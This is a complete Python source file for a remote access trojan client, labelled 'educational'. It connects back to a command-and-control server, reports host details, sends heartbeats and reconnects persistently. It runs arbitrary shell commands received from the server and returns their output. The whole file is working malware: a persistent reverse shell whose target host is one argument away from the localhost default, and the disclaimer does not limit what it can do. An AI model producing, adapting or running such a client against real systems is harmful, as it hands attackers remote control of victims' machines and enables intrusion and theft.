#!/usr/bin/env python3
"""
Educational Remote Administration Tool (RAT) client.

This script is intentionally simple and is meant ONLY for learning about
basic client/server networking concepts. Do NOT run this against any
system or network you do not own or have explicit permission to test.

Usage (example, from the machine being controlled):
    python rat.py --host 127.0.0.1 --port 9001

Then run the CNC server on your own machine and connect to it.
"""

from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess
import sys
import threading
import time
from typing import Any, Dict


DEFAULT_RECONNECT_DELAY = 5.0  # seconds


def send_json_line(sock: socket.socket, payload: Dict[str, Any]) -> None:
    """
    Send a single JSON object, newline-terminated.
    """
    data = (json.dumps(payload) + "\n").encode("utf-8", errors="ignore")
    sock.sendall(data)


def recv_json_line(sock: socket.socket) -> Dict[str, Any] | None:
    """
    Receive a single JSON object, assuming newline-delimited messages.
    Returns None if the connection is closed.
    """
    chunks: list[bytes] = []
    while True:
        chunk = sock.recv(1)
        if not chunk:
            # connection closed
            if not chunks:
                return None
            break
        if chunk == b"\n":
            break
        chunks.append(chunk)
    raw = b"".join(chunks).decode("utf-8", errors="ignore").strip()
    if not raw:
        return None
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return None


def run_command(cmd: str, cwd: str | None = None) -> Dict[str, Any]:
    """
    Run a shell command and capture stdout, stderr and exit code.
    """
    try:
        completed = subprocess.run(
            cmd,
            shell=True,
            cwd=cwd,
            capture_output=True,
            text=True,
        )
        return {
            "ok": True,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
            "returncode": completed.returncode,
        }
    except Exception as exc:  # pragma: no cover - defensive
        return {"ok": False, "error": repr(exc)}


def heartbeat_loop(sock: socket.socket, stop_event: threading.Event) -> None:
    """
    Periodically send a small heartbeat so the server can see we're alive.
    """
    while not stop_event.is_set():
        try:
            send_json_line(sock, {"type": "heartbeat", "cwd": os.getcwd()})
        except OSError:
            break
        stop_event.wait(20.0)


def client_loop(host: str, port: int) -> None:
    """
    Connect to the CNC server and process commands.
    """
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((host, port))
        except OSError as exc:
            print(f"[rat] Failed to connect to {host}:{port}: {exc}", file=sys.stderr)
            time.sleep(DEFAULT_RECONNECT_DELAY)
            continue

        print(f"[rat] Connected to CNC at {host}:{port}")
        stop_event = threading.Event()
        hb_thread = threading.Thread(
            target=heartbeat_loop, args=(sock, stop_event), daemon=True
        )
        hb_thread.start()

        # Send initial hello
        hello_payload = {
            "type": "hello",
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "platform": sys.platform,
            "pid": os.getpid(),
        }
        try:
            send_json_line(sock, hello_payload)
        except OSError:
            sock.close()
            continue

        try:
            while True:
                msg = recv_json_line(sock)
                if msg is None:
                    print("[rat] CNC disconnected")
                    break

                msg_type = msg.get("type")

                if msg_type == "ping":
                    send_json_line(sock, {"type": "pong"})
                elif msg_type == "exec":
                    cmd = msg.get("cmd") or ""
                    resp = run_command(cmd)
                    send_json_line(
                        sock,
                        {
                            "type": "exec_result",
                            "cmd": cmd,
                            "result": resp,
                            "cwd": os.getcwd(),
                        },
                    )
                elif msg_type == "cd":
                    path = msg.get("path") or ""
                    try:
                        os.chdir(path)
                        ok = True
                        err = ""
                    except OSError as exc:
                        ok = False
                        err = str(exc)
                    send_json_line(
                        sock,
                        {
                            "type": "cd_result",
                            "ok": ok,
                            "error": err,
                            "cwd": os.getcwd(),
                        },
                    )
                elif msg_type == "pwd":
                    send_json_line(sock, {"type": "pwd_result", "cwd": os.getcwd()})
                elif msg_type == "exit":
                    print("[rat] Received exit command, closing.")
                    send_json_line(sock, {"type": "bye"})
                    sock.close()
                    return
                else:
                    # Unknown command
                    send_json_line(
                        sock,
                        {
                            "type": "error",
                            "error": f"Unknown command type: {msg_type!r}",
                        },
                    )
        finally:
            stop_event.set()
            try:
                sock.close()
            except OSError:
                pass

        # Try to reconnect after a delay
        time.sleep(DEFAULT_RECONNECT_DELAY)


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Educational RAT client that connects to a CNC server.",
    )
    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="CNC server hostname or IP (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=9001,
        help="CNC server TCP port (default: 9001)",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    args = parse_args(argv)
    client_loop(args.host, args.port)


if __name__ == "__main__":
    main()


